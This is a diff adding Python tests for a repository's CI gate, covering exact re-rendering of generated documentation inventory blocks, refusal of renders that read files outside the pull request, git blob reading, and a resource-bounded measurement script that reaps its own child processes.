+def test_a_block_must_equal_mains_render(inventory_repo):
+    """FEAT-CICD-001 spec, "Exact render" (done_when[1]): a hand-edited row is refused with the first difference and
+    the exact re-render command, and a renderer that fails on the pull request's files refuses with its exception
+    line rather than passing, reporting a difference, or crashing the gate."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        hand = pr(root, BRANCH, {**moved, API_DOC: edit(moved[API_DOC], "Liveness probe:", "Liveness probe, hand-edited:")}, **DOCS_OK)
+        broken = pr(root, BRANCH, {**moved, MAIN_PY: moved_main() + "\ndef broken(:\n"}, **DOCS_OK)
+        # (red-team round 1: the docs test's block pattern ends at the first end marker even mid-line, so main's
+        # differing_blocks read the block as ending there and passed the hand-written row after it)
+        end = "\n<!-- inventory:routes:end -->"
+        behind = pr(root, BRANCH, {**moved, API_DOC: edit(moved[API_DOC], end, end + " (hand)\n| `GET` | `/api/hand-written` | x | not rendered |" + end)}, **DOCS_OK)
+        # (red-team round 2: a blank line added at a block's end was refused as "first difference: the same lines")
+        blank = pr(root, BRANCH, {**moved, API_DOC: edit(moved[API_DOC], end, "\n" + end)}, **DOCS_OK)
+        missed = [k for k, ok in {
+            "hand edit": refused(hand, "differs from main's render") and f"--restore {API_DOC}" in hand.stdout and SNAPSHOT_FILE in hand.stdout,
+            "a hand row behind a line that begins with the end marker": refused(behind, "differs from main's render"),
+            "a blank line at a block's end, named": refused(blank, "differs from main's render") and "-'' +'<missing>'" in blank.stdout,
+            "renderer failure": refused(broken, "renderer failed") and "SyntaxError" in broken.stdout and "Traceback" not in broken.stderr,
+        }.items() if not ok]
+        assert missed == [], hand.stdout + broken.stdout + broken.stderr + behind.stdout + blank.stdout
+
+
+def test_the_render_reads_only_the_pull_requests_files(inventory_repo, tmp_path_factory):
+    """FEAT-CICD-001 spec, "Exact render" (done_when[1]): a render that opens a file outside the materialized tree
+    (a job entrypoint given as an absolute path) is refused and names the file; the same job inside the tree passes."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        outside = tmp_path_factory.mktemp("outside") / "evil_job.py"
+        outside.write_text('"""A job entrypoint outside the tree."""\n', encoding="utf-8")
+        deploy = RENDER_SOURCE["gcp/deploy.sh"]
+        escaped = pr(root, BRANCH, {MAIN_PY: moved_main(), "gcp/deploy.sh": deploy + JOB.format(outside)}, then=render, **DOCS_OK)
+        inside = pr(root, BRANCH, {MAIN_PY: moved_main(), "gcp/evil_job.py": outside.read_text(encoding="utf-8"),
+                                   "gcp/deploy.sh": deploy + JOB.format("gcp/evil_job.py")}, then=render, **DOCS_OK)
+        assert (refused(escaped, "read outside this pull request's files"), "evil_job.py" in escaped.stdout, inside.returncode) == (True, True, 0), \
+            escaped.stdout + inside.stdout
+
+
+def test_the_refused_heads_have_accepted_controls(inventory_repo):
+    """FEAT-CICD-001 spec (done_when[1]): the controls for the clean-bytes and head-tree cases, each differing only in
+    the condition under test, pass: the route without an escape, and a plain spliced entry."""
+    if RENDERER_HERE:
+        root, moved = inventory_repo
+        route = pr(root, BRANCH, {MAIN_PY: moved_main() + ROUTE.format("")}, then=render, **DOCS_OK)   # Task 6's route, no escape
+        change(root, BRANCH, moved)
+        blob = subprocess.run(["git", "hash-object", "-w", "--stdin"], input="x", cwd=root, capture_output=True, text=True, check=True).stdout.strip()
+        x = mktree(root, f"100644 blob {blob}\tx\n")
+        b, h = spliced(root, f"040000 tree {x}\tok")   # Task 7's splice, a plain entry
+        plain = gate(root, "--pr", b, h, PR_HEAD_REF=BRANCH, **DOCS_OK)
+        assert (route.returncode, plain.returncode) == (0, 0), route.stdout + plain.stdout
+
+
+def test_the_skill_names_the_inventory_allowance():
+    """FEAT-CICD-001 spec, the allowance (done_when[7]): the product-delivery skill's "Never" list names the
+    re-rendered inventory blocks as a change a feature branch may carry, and cites REQ-GOV-004."""
+    skill = (REPO / ".claude/skills/product-delivery/SKILL.md").read_text(encoding="utf-8")
+    never = next(line for line in skill.splitlines() if line.startswith("- Never edit `docs/product/` from a feature branch"))
+    assert "REQ-GOV-004" in never and "re-rendered by `scripts/maintenance/doc_inventory.py`" in never, never
+    assert "existing fixed renderer-owned count/as-of substitutions" in never, never
+    assert all(name in never for name in ('05-a-ARCHITECTURE.md', '05-c-DATA_DEPENDENCIES.md', '05-e-API.md')), never
+
+def test_inventory_budget_observer_keeps_cicd_ownership(repo):
+    """An unrelated feature cannot replace the budget verdict; the actual CICD owner can."""
+    ci_branch = "fix/feat-cicd-001-inventory-budget"
+    ci_spec = "docs/superpowers/specs/2026-09-01-inventory-budget.md"
+    ci_plan = "docs/superpowers/plans/2026-09-01-inventory-budget.md"
+    ci_catalog = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\\n| [FEAT-DATA-001]", 1)
+    on_base(repo, {CATALOG: ci_catalog, ci_spec: spec(feat_id="FEAT-CICD-001"),
+                   ci_plan: plan(feat_id="FEAT-CICD-001", spec=ci_spec, branch=ci_branch)})
+    payload = {"tests/scripts/measure_inventory_render.py": "print('actual fixture observer')\\n"}
+    unrelated = pr(repo, BRANCH, payload, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body())
+    owner = pr(repo, ci_branch, payload, PR_TITLE="FEAT-CICD-001: observer", PR_BODY=body(spec_path=ci_spec, plan_path=ci_plan))
+    assert unrelated.returncode == 1 and "belong to FEAT-CICD-001" in unrelated.stdout, unrelated.stdout
+    assert owner.returncode == 0, owner.stdout + owner.stderr
+
+
+def complete_inventory_case(root: Path) -> dict[str, str]:
+    """Real BASE prose with old counter/date shapes; unchanged renderer supplies every expected byte."""
+    prose = ("\nDeclared: 999 runtime-created relations (999 tables, 999 materialized views, 999 views).\n"
+             "Live 2001-02-03; read on **2001-02-03**; from the 2001-02-03 live snapshot.\n"
+             "Historical correction: 2001-02-03. Neighbor: unchanged.\n")
+    on_base(root, {d: _git(root, 'show', f'base:{d}') + prose for d in GENERATED})
+    change(root, BRANCH, {MAIN_PY: moved_main(),
+                          'gcp/schema.sql': RENDER_SOURCE['gcp/schema.sql'] + '\nCREATE TABLE new_observations (id INTEGER);\n'}, then=render)
+    return {p: (root / p).read_text(encoding='utf-8') for p in (MAIN_PY, 'gcp/schema.sql', *GENERATED)}
+
+
+def test_complete_inventory_renders_from_merge_base_prose(inventory_repo):
+    """Full actual trusted output allows only BASE counter/asof shapes plus fresh HEAD source citations."""
+    if RENDERER_HERE:
+        root, _moved = inventory_repo
+        expected = complete_inventory_case(root)
+        assert all('999 runtime-created relations' not in expected[d] and '999 tables' not in expected[d]
+                   and 'Live 2001-02-03' not in expected[d] and 'Historical correction: 2001-02-03.' in expected[d]
+                   for d in GENERATED), expected
+        r = pr(root, BRANCH, expected, **DOCS_OK)
+        assert r.returncode == 0, r.stdout + r.stderr
+        assert set(_git(root, 'diff', '--name-only', 'base', 'HEAD').splitlines()) == {MAIN_PY, 'gcp/schema.sql', *GENERATED}
+
+
+def test_complete_inventory_refuses_non_renderer_prose(inventory_repo):
+    """Each refused head differs from the actual accepted full render in exactly its named condition."""
+    if RENDERER_HERE:
+        root, _moved = inventory_repo
+        expected = complete_inventory_case(root)
+        text = expected[API_DOC]
+        import re
+        total = re.search(r'\d+ runtime-created relations', text).group(0)
+        breakdown = re.search(r'\(\d+ tables?, \d+ materialized views?, \d+ views?\)', text).group(0)
+        live = re.search(r'Live \d{4}-\d{2}-\d{2}', text).group(0)
+        cases = {
+            'wrong total': edit(text, total, '999 runtime-created relations'),
+            'wrong breakdown': edit(text, breakdown, '(999 tables, 999 materialized views, 999 views)'),
+            'wrong snapshot date': edit(text, live, 'Live 2001-02-03'),
+            'neighbor': edit(text, 'Neighbor: unchanged.', 'Neighbor: changed.'),
+            'historical date': edit(text, 'Historical correction: 2001-02-03.', 'Historical correction: 2002-03-04.'),
+            'new count pattern': text + '\n999 runtime-created relations\n',
+            'new asof pattern': text + '\nLive 2001-02-03\n',
+            'same-valued new pattern': text + '\n' + total + '\n' + live + '\n',
+        }
+        control = pr(root, BRANCH, expected, **DOCS_OK)
+        results = {name: pr(root, BRANCH, {**expected, API_DOC: changed}, **DOCS_OK) for name, changed in cases.items()}
+        assert control.returncode == 0, control.stdout + control.stderr
+        assert all(refused(r, "differs from main's render") for r in results.values()), {
+            name: r.stdout + r.stderr for name, r in results.items() if not refused(r, "differs from main's render")}
+
+
+MEASURE = 'tests/scripts/measure_inventory_render.py'
+
+
+def measurement(root: Path, *args: str) -> tuple[subprocess.CompletedProcess, dict]:
+    r = subprocess.run([sys.executable, str(root / MEASURE), *args], cwd=root, capture_output=True, text=True)
+    return r, json.loads(r.stdout) if r.stdout.strip().startswith('{') else {}
+
+
+def test_measure_inventory_render_runs_the_actual_gate(inventory_repo):
+    """Actual committed-tree CLI uses real trusted gate; uncommitted application bytes are not its source."""
+    if RENDERER_HERE:
+        root, _moved = inventory_repo
+        assert (REPO / MEASURE).is_file(), 'approved standalone observer is missing'
+        on_base(root, {MEASURE: (REPO / MEASURE).read_text(encoding='utf-8')})
+        # A path with spaces travels through real argv, not shell interpolation.
+        spaced = root.parent / 'render repository with spaces'
+        root.rename(spaced); root = spaced
+        write(root, MAIN_PY, 'raise RuntimeError("dirty worktree must not run")\n')
+        r, report = measurement(root, '--ref', 'base', '--max-rss-mib', '128', '--max-seconds', '10', '--output', str(root.parent/'accepted-output.json'))
+        assert r.returncode == 0 and report['kind'] == 'committed-inventory-render', r.stdout + r.stderr
+        assert json.loads((root.parent/'accepted-output.json').read_text()) == report
+        assert report['worker']['ref'] == _git(root, 'rev-parse', 'base') and report['worker']['renderer_exit'] == 0
+        assert report['worker']['source_bytes'] > 0 and report['worker']['source_entries'] > 10
+        assert Path(report['worker']['renderer_argv'][5]).is_absolute() and 'spec-gate-render-' in report['worker']['renderer_argv'][5]
+        assert report['worker']['renderer_cwd'] and all('<owned' not in arg for arg in report['worker']['renderer_argv'])
+        assert report['sample_count'] > 1 and report['peak_rss_bytes'] >= report['monitor_rss_bytes'] > 0
+        assert report['sample_gap_seconds']['max'] > 0 and report['discovery_gap_seconds']['max'] > 0
+        assert report['kernel_child_peak_bytes'] > 0 and report['owned_group_gone']
+        for option, value in [('--max-rss-mib','513'),('--max-seconds','61'),('--max-seconds','nan'),
+                              ('--max-rss-mib','0'),('--max-seconds','true')]:
+            bad, _ = measurement(root, '--ref', 'base', option, value)
+            assert bad.returncode != 0, (option, value, bad.stdout)
+        # Trust checking is independent of the committed app tree and rejects forged observer/gate bytes.
+        write(root, 'scripts/gate/spec_gate.py', (root / 'scripts/gate/spec_gate.py').read_text() + '\n# forged trusted helper\n')
+        bad, evidence = measurement(root, '--ref', 'base', '--max-seconds', '10')
+        assert bad.returncode != 0 and not evidence['ok'] and 'trusted input differs' in evidence['stderr'], bad.stdout + bad.stderr
+        # An unchanged helper cannot turn an actual renderer parse/refusal into a budget success.
+        on_base(root, {MAIN_PY: RENDER_SOURCE[MAIN_PY] + '\ndef invalid(:\n'})
+        bad, evidence = measurement(root, '--ref', 'base', '--max-seconds', '10')
+        assert bad.returncode != 0 and evidence['worker']['renderer_exit'] != 0, bad.stdout + bad.stderr
+        assert 'SyntaxError' in '\n'.join(evidence['worker']['refusals']) and evidence['owned_group_gone']
+        on_base(root, {MAIN_PY: RENDER_SOURCE[MAIN_PY], SNAPSHOT_FILE: None})
+        bad, evidence = measurement(root, '--ref', 'base', '--max-seconds', '10')
+        assert bad.returncode != 0 and not evidence['ok'] and evidence['owned_group_gone'], bad.stdout + bad.stderr
+        # Source identity covers the observer itself, independently of gate identity.
+        on_base(root, {SNAPSHOT_FILE: (REPO / SNAPSHOT_FILE).read_text(encoding='utf-8')})
+        write(root, MEASURE, (root / MEASURE).read_text() + '\n# changed trusted monitor\n')
+        bad, evidence = measurement(root, '--ref', 'base', '--max-seconds', '10')
+        assert bad.returncode != 0 and 'trusted input differs' in evidence['stderr'], bad.stdout + bad.stderr
+
+
+def bounded_measurement(tmp_path: Path, code: str, *, mib: int = 128, seconds: float = 2) -> dict:
+    """Run the actual private monitor in a fresh process, with actual harmless owned child groups."""
+    assert (REPO / MEASURE).is_file(), 'approved standalone observer is missing'
+    launcher = (
+        "import importlib.util,json,pathlib,sys; "
+        "s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]); "
+        "m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m); "
+        "r=m.run_bounded([sys.executable,'-c',sys.argv[2]],pathlib.Path(sys.argv[3]),"
+        "max_rss_bytes=int(sys.argv[4]),max_seconds=float(sys.argv[5]));print(json.dumps(r))"
+    )
+    r = subprocess.run([sys.executable,'-c',launcher,str(REPO / MEASURE),code,str(tmp_path),str(mib*1024*1024),str(seconds)],
+                       capture_output=True,text=True,timeout=10)
+    assert r.returncode == 0, r.stdout + r.stderr
+    return json.loads(r.stdout)
+
+
+def test_measure_inventory_render_real_memory_refusal(tmp_path):
+    """A sustained actual allocation, not a mocked sample, crosses a lowered combined monitor/group cap."""
+    good = bounded_measurement(tmp_path, 'import time; a=bytearray(1024*1024);time.sleep(.2)', mib=64)
+    bad = bounded_measurement(tmp_path, 'import time; a=bytearray(96*1024*1024);time.sleep(2)', mib=64)
+    assert good['ok'] and good['owned_group_gone'], good
+    assert not bad['ok'] and bad['reason'] == 'rss_limit' and bad['peak_rss_bytes'] > 64*1024*1024, bad
+    assert bad['owned_group_gone'] and bad['monitor_rss_bytes'] > 0 and bad['sample_count'] > 1
+
+
+def test_measure_inventory_render_real_timeout_reaps_group(tmp_path):
+    """Actual parent+grandchild outlive lowered deadline; entire owned group is killed and reaped."""
+    pidfile = tmp_path / 'owned-pids.json'
+    code = ("import json,os,subprocess,sys,time; "
+            "p=subprocess.Popen([sys.executable,'-c','import time;time.sleep(20)']); "
+            f"open({str(pidfile)!r},'w').write(json.dumps([os.getpid(),p.pid]));time.sleep(20)")
+    bad = bounded_measurement(tmp_path, code, seconds=1)
+    pids = json.loads(pidfile.read_text())
+    assert not bad['ok'] and bad['reason'] == 'time_limit' and bad['owned_group_gone'], bad
+    assert all(not Path(f'/proc/{p}').exists() for p in pids), (pids, bad)
+    good = bounded_measurement(tmp_path, 'import time;time.sleep(.05)', seconds=1)
+    nonzero = bounded_measurement(tmp_path, 'raise SystemExit(7)')
+    assert good['ok'] and good['owned_group_gone'], good
+    assert not nonzero['ok'] and nonzero['worker_exit'] == 7 and nonzero['owned_group_gone'], nonzero
+
+
+def test_measure_inventory_render_refuses_unavailable_proc(tmp_path):
+    """Missing actual observation files refuse before creating a child; no assumed RSS pass."""
+    assert (REPO / MEASURE).is_file()
+    launch = ("import importlib.util,json,pathlib,sys; "
+              "s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]); "
+              "m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m); "
+              "m.PROC=pathlib.Path(sys.argv[2]); "
+              "print(json.dumps(m.run_bounded([sys.executable,'-c','pass'],pathlib.Path.cwd(),"
+              "max_rss_bytes=128*1024*1024,max_seconds=1)))")
+    r = subprocess.run([sys.executable,'-c',launch,str(REPO / MEASURE),str(tmp_path/'absent-proc')],
+                       capture_output=True,text=True,timeout=5)
+    evidence = json.loads(r.stdout)
+    assert r.returncode == 0 and not evidence['ok'] and evidence['reason'] == 'observation_failure', r.stdout + r.stderr
+    assert 'process_group' not in evidence and evidence['sample_count'] == 0
+
+
+class _OneBlobShowFailure:
+    """Fail one transport operation, then delegate every call to actual git."""
+    def __init__(self, run):
+        self.run, self.failed = run, False
+
+    def __call__(self, args, *a, **kw):
+        if not self.failed and "show" in args and any(str(x).endswith(":lib/recovery.py") for x in args):
+            self.failed = True
+            return subprocess.CompletedProcess(args, 128, b"", b"transient object read failure")
+        return self.run(args, *a, **kw)
+
+
+def test_committed_blob_cache_keeps_mutable_refs_index_and_failures_fresh(repo, monkeypatch):
+    """Revision reads preserve mutation/error behavior without stale ref or failure retention."""
+    sg = load_gate(repo)
+    original = _git(repo, "rev-parse", "base")
+    immutable, moving = sg.Tree(original), sg.Tree("base")
+    assert immutable.raw("lib/model.py") == b"DECISION = 'size'\n"
+    assert moving.raw("lib/model.py") == b"DECISION = 'size'\n"
+    on_base(repo, {"lib/model.py": "DECISION = 'new'\r\n"})
+    assert moving.raw("lib/model.py") == b"DECISION = 'new'\r\n"
+    assert moving.read("lib/model.py") == "DECISION = 'new'\n"
+    assert immutable.raw("lib/model.py") == b"DECISION = 'size'\n"
+    index, worktree = sg.Tree(None), sg.Tree(sg.WORKTREE)
+    assert index.raw("lib/model.py") == b"DECISION = 'new'\r\n"
+    write(repo, "lib/model.py", "unstaged\n")
+    assert worktree.raw("lib/model.py") == b"unstaged\n"
+    _git(repo, "add", "lib/model.py")
+    assert index.raw("lib/model.py") == b"unstaged\n"
+    write(repo, "lib/model.py", "another unstaged\n")
+    assert worktree.raw("lib/model.py") == b"another unstaged\n"
+    assert index.raw("lib/model.py") == b"unstaged\n"
+
+    # A transient git-show failure cannot become cached absence. Recover through
+    # the SAME Tree and real git; the new path has no preexisting cached value.
+    on_base(repo, {"lib/recovery.py": "RECOVERED = True\n", "lib/empty.py": ""})
+    recovered = sg.Tree(_git(repo, "rev-parse", "base"))
+    transient = _OneBlobShowFailure(sg.subprocess.run)
+    monkeypatch.setattr(sg.subprocess, "run", transient)
+    assert recovered.raw("lib/recovery.py") is None
+    assert recovered.raw("lib/recovery.py") == b"RECOVERED = True\n"
+    assert transient.failed
+    assert recovered.raw("lib/empty.py") == b"", "Empty committed bytes are not an absent path"
+    assert recovered.raw("lib/missing.py") is None, "An actually absent path remains unavailable"
+
+
+class _PolicyBatchTransportFailure:
+    """Fail the actual batched transport; keep test bodies free of suite exits."""
+    def __init__(self, run):
+        self.run = run
+
+    def __call__(self, args, *a, **kw):
+        if "cat-file" in args:
+            return subprocess.CompletedProcess(args, 128, b"", b"transient batch transport failure")
+        return self.run(args, *a, **kw)
+
+
+def test_fresh_policy_batch_preserves_bytes_absence_replace_root_and_errors(repo, tmp_path, monkeypatch):
+    """Actual immutable-policy reads stay fresh across replacements, roots and Git failures."""
+    # Earlier in-process docs_audit.main() calls intentionally disable replacements.
+    # This fixture explicitly exercises enabled replacement refs, then both modes.
+    monkeypatch.delenv("GIT_NO_REPLACE_OBJECTS", raising=False)
+    sg = load_gate(repo)
+    mixed = b"first\r\nnext\rlast\x00\xff\n"
+    on_base(repo, {CATALOG: "placeholder", TRACEABILITY: ""},
+            then=lambda root: (root / CATALOG).write_bytes(mixed))
+    original = _git(repo, "rev-parse", "base")
+    queries = [(original, CATALOG), (original, TRACEABILITY)]
+    assert sg.policy_blob_bytes(queries) == [mixed, b""]
+    assert sg.close_out_policy(queries) == [sg.Tree(original).read(CATALOG), ""]
+    on_base(repo, {CATALOG: "replacement\n", TRACEABILITY: None})
+    replacement = _git(repo, "rev-parse", "base")
+    assert sg.policy_blob_bytes([(replacement, TRACEABILITY)]) == [None]
+    _git(repo, "replace", original, replacement)
+    with monkeypatch.context() as disabled:
+        disabled.setenv("GIT_NO_REPLACE_OBJECTS", "1")
+        assert sg.policy_blob_bytes(queries) == [mixed, b""]
+        assert [sg.Tree(original).raw(path) for _, path in queries] == [mixed, b""]
+    assert sg.policy_blob_bytes(queries) == [b"replacement\n", None]
+    other = tmp_path / "other"
+    shutil.copytree(repo, other)
+    on_base(other, {CATALOG: "other repository\n"})
+    _git(other, "replace", "-f", original, _git(other, "rev-parse", "base"))
+    monkeypatch.setattr(sg, "ROOT", other)
+    assert sg.policy_blob_bytes(queries) == [b"other repository\n", None]
+    monkeypatch.setattr(sg, "ROOT", repo)
+    assert sg.policy_blob_bytes(queries) == [b"replacement\n", None]
+    _git(repo, "replace", "-d", original)
+    assert sg.policy_blob_bytes(queries) == [mixed, b""]
+
+    real_run = sg.subprocess.run
+    monkeypatch.setattr(sg.subprocess, "run", _PolicyBatchTransportFailure(real_run))
+    with pytest.raises(sg.GitFailed, match="transient batch transport failure"):
+        sg.policy_blob_bytes(queries)
+    monkeypatch.setattr(sg.subprocess, "run", real_run)
+    assert sg.policy_blob_bytes(queries) == [mixed, b""]
+    with pytest.raises(sg.GitFailed, match="commit"):
+        sg.policy_blob_bytes([("0" * 40, CATALOG)])
+    for bad in (("base", CATALOG), (original, "lib/model.py")):
+        with pytest.raises(sg.GitFailed, match="fixed committed policy"):
+            sg.policy_blob_bytes([bad])
+    on_base(repo, {CATALOG: None, CATALOG + "/child.md": "not a policy blob\n"})
+    with pytest.raises(sg.GitFailed, match="blob header"):
+        sg.policy_blob_bytes([(_git(repo, "rev-parse", "base"), CATALOG)])
+
+
+def test_fresh_policy_batch_refuses_malformed_size_type_and_missing_commit(repo, monkeypatch):
+    """A transport success cannot disguise bad framing, missing objects or nonblob policy."""
+    sg = load_gate(repo)
+    revision = _git(repo, "rev-parse", "base")
+    info = f"{revision} commit 12\n".encode()
+    oid = b"1" * 40
+    good = info + oid + b" blob 3\nabc\n"
+    replies = [good, info + f"{revision}:{TRACEABILITY} missing\n".encode(),
+               info + oid + b" blob -1\n\n", info + oid + b" blob nope\n\n",
+               info + oid + b" blob 300\nabc\n", info + oid + b" blob 3\nabcX",
+               info + oid + b" tree 3\nabc\n", info + b"not a header\n",
+               good + b"extra", info + oid + b" blob 3", b"0" * 40 + b" missing\n",
+               info + oid + b" blob " + b"9" * 5000 + b"\n"]
+    def reply(value):
+        monkeypatch.setattr(sg.subprocess, "run", lambda args, **kw: subprocess.CompletedProcess(args, 0, value, b""))
+    reply(good)
+    assert sg.policy_blob_bytes([(revision, CATALOG)]) == [b"abc"]
+    reply(replies[1])
+    assert sg.policy_blob_bytes([(revision, TRACEABILITY)]) == [None]
+    for broken in replies[2:]:
+        reply(broken)
+        with pytest.raises(sg.GitFailed):
+            sg.policy_blob_bytes([(revision, CATALOG)])
+
+
+def test_close_out_batch_keeps_current_policy_base_separate_from_merge_base(repo):
+    """Real PR DAG: newly adopted BASE trace policy cannot be bypassed via older merge-base."""
+    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True),
+            "PR_NUMBER": "42", "PR_DRAFT": "false", "PR_HEAD_REF": BRANCH}
+    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |",
+                               f"| Models | Production | {TODAY} | #42 |")
+    change(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row})
+    head, old_base = _git(repo, "rev-parse", "HEAD"), _git(repo, "rev-parse", "base")
+    control = gate(repo, "--pr", old_base, head, **meta)
+    assert control.returncode == 0, control.stdout
+    on_base(repo, {TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #1 prior\n"})
+    policy = _git(repo, "rev-parse", "base")
+    assert _git(repo, "merge-base", policy, head) == old_base
+    refused = gate(repo, "--pr", policy, head, **meta)
+    assert refused.returncode == 1 and "section's PR lineage" in refused.stdout, refused.stdout
+
+    sg = load_gate(repo)
+    assert sg.close_out_policy([(head, CATALOG)]) == [sg.Tree(head).read(CATALOG)]
+
+
+def escaped_measurement(tmp_path: Path, *, mib: int, parent_exit: int | None, child_seconds: float) -> dict:
+    """Native setsid child; outer supervisor rescues any old broken-monitor orphan before asserting RED."""
+    pidfile = tmp_path / f'escaped-{mib}-{parent_exit}-{child_seconds}.pid'
+    child = ("import os,time;os.setsid();" + f"open({str(pidfile)!r},'w').write(str(os.getpid()));" +
+             "a=bytearray(" + str(mib*1024*1024) + ");" +
+             f"open({str(pidfile)+'.ready'!r},'w').write('ready');time.sleep({child_seconds})")
+    parent = ("import os,subprocess,sys,time; p=subprocess.Popen([sys.executable,'-c'," + repr(child) + "]);"
+              "\nfor _ in range(1000):\n if os.path.exists(" + repr(str(pidfile)+'.ready') + "):break\n time.sleep(.001)\n")
+    parent += 'time.sleep(20)' if parent_exit is None else ('p.wait();' if child_seconds < 1 else '') + f'raise SystemExit({parent_exit})'
+    launcher = ("import ctypes,importlib.util,json,pathlib,os,signal,sys;ctypes.CDLL(None).prctl(36,1,0,0,0);"
+                "s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);"
+                "m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m);"
+                "r=m.run_bounded([sys.executable,'-c',sys.argv[2]],pathlib.Path(sys.argv[3]),max_rss_bytes=64*1024*1024,max_seconds=1);"
+                "pid=int(pathlib.Path(sys.argv[4]).read_text());r['escaped_alive_after_monitor']=pathlib.Path('/proc',str(pid)).exists();"
+                "\ntry:os.kill(pid,signal.SIGKILL)\nexcept ProcessLookupError:pass\n"
+                "try:os.waitpid(pid,0)\nexcept ChildProcessError:pass\n"
+                "r['outer_cleanup_complete']=not pathlib.Path('/proc',str(pid)).exists();print(json.dumps(r))")
+    r = subprocess.run([sys.executable,'-c',launcher,str(REPO/MEASURE),parent,str(tmp_path),str(pidfile)],
+                       capture_output=True,text=True,timeout=5)
+    assert r.returncode == 0, r.stdout + r.stderr
+    return json.loads(r.stdout)
+
+
+def test_measure_inventory_render_owns_session_changing_descendants(tmp_path):
+    """Stable escaped RSS is counted; root-success, timeout and error all stop/reap their actual family."""
+    memory = escaped_measurement(tmp_path,mib=96,parent_exit=0,child_seconds=20)
+    assert not memory['ok'] and memory['reason']=='rss_limit' and memory['peak_rss_bytes']>64*1024*1024, memory
+    assert not memory['escaped_alive_after_monitor'] and memory['outer_cleanup_complete'], memory
+    accepted = escaped_measurement(tmp_path,mib=1,parent_exit=0,child_seconds=.1)
+    assert accepted['ok'] and not accepted['escaped_alive_after_monitor'], accepted
+    timeout = escaped_measurement(tmp_path,mib=1,parent_exit=None,child_seconds=20)
+    failed = escaped_measurement(tmp_path,mib=1,parent_exit=7,child_seconds=20)
+    assert not timeout['ok'] and timeout['reason']=='time_limit' and not timeout['escaped_alive_after_monitor'], timeout
+    assert not failed['ok'] and failed['worker_exit']==7 and not failed['escaped_alive_after_monitor'], failed
+    assert all(x['owned_family_gone'] for x in (memory,accepted,timeout,failed))
+
+
+def test_measure_inventory_render_bounds_public_output_delivery(tmp_path):
+    """Real FIFO and full stdout-pipe backpressure cannot outlive the same whole public CLI bound."""
+    import fcntl
+    import time
+    fifo = tmp_path/'no-reader';os.mkfifo(fifo)
+    args = [sys.executable,str(REPO/MEASURE),'--max-rss-mib','1','--max-seconds','.2']
+    started=time.monotonic()
+    good=subprocess.run([*args,'--output',str(tmp_path/'ordinary.json')],capture_output=True,text=True,timeout=2)
+    assert good.returncode==1 and json.loads(good.stdout)['ok'] is False and time.monotonic()-started<1
+    started=time.monotonic()
+    blocked=subprocess.Popen([*args,'--output',str(fifo)],stdout=subprocess.PIPE,stderr=subprocess.PIPE,start_new_session=True)
+    try:
+        out,err=blocked.communicate(timeout=1)
+        assert blocked.returncode!=0 and time.monotonic()-started<.8, (out,err)
+    finally:
+        if blocked.poll() is None:os.killpg(blocked.pid,9);blocked.communicate(timeout=1)
+    readfd,writefd=os.pipe();fcntl.fcntl(writefd,fcntl.F_SETPIPE_SZ,4096);os.write(writefd,b'x'*4096)
+    try:
+        started=time.monotonic();blocked=subprocess.Popen(args,stdout=writefd,stderr=subprocess.PIPE,start_new_session=True)
+        try:
+            blocked.wait(timeout=1)
+            assert blocked.returncode!=0 and time.monotonic()-started<.8
+        finally:
+            if blocked.poll() is None:os.killpg(blocked.pid,9);blocked.wait(timeout=1)
+            blocked.stderr.close()
+    finally:os.close(readfd);os.close(writefd)
+
+
+def test_measure_inventory_render_never_kills_an_existing_unrelated_child(tmp_path):
+    """Private harness refuses ambiguous ownership before launch, leaving a preexisting child untouched."""
+    launcher = ("import importlib.util,json,pathlib,subprocess,sys; "
+                "s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]); "
+                "m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m); "
+                "p=subprocess.Popen([sys.executable,'-c','import time;time.sleep(20)']); "
+                "\ntry:\n r=m.run_bounded([sys.executable,'-c','pass'],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=1);"
+                "r['unrelated_alive']=p.poll() is None;print(json.dumps(r))"
+                "\nfinally:p.kill();p.wait()")
+    r=subprocess.run([sys.executable,'-c',launcher,str(REPO/MEASURE)],capture_output=True,text=True,timeout=4)
+    assert r.returncode==0, r.stdout+r.stderr
+    evidence=json.loads(r.stdout)
+    assert not evidence['ok'] and evidence['unrelated_alive'] and 'process_group' not in evidence, evidence
+    assert 'exclusive descendant ownership' in evidence['error'], evidence
+
+
+def test_measure_inventory_render_bounds_startup_usage_output(tmp_path):
+    """Help and parse errors use the same deadline and unbuffered bounded delivery as the final verdict."""
+    import fcntl
+    import time
+    for option in ('--help','--unknown-option'):
+        readfd,writefd=os.pipe();fcntl.fcntl(writefd,fcntl.F_SETPIPE_SZ,4096);os.write(writefd,b'x'*4096)
+        try:
+            started=time.monotonic()
+            p=subprocess.Popen([sys.executable,str(REPO/MEASURE),'--max-seconds','.2',option],
+                               stdout=writefd,stderr=writefd,start_new_session=True)
+            try:
+                p.wait(timeout=1)
+                assert p.returncode!=0 and time.monotonic()-started<.8
+            finally:
+                if p.poll() is None:os.killpg(p.pid,9);p.wait(timeout=1)
+        finally:os.close(readfd);os.close(writefd)
+
+
+LIFECYCLE_PROBE = r'''
+import ctypes,importlib.util,json,os,pathlib,signal,subprocess,sys,time
+s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
+mode=sys.argv[2];children=[];opened=[];report=None;outer=None
+hits=dict(popen=0,table_fault=0,pidfd=0,pidfd_delay=0,pidfd_failure=0,spawn_delay=0,rss_fault=0,cleanup_delay=0,prior_get_failure=0)
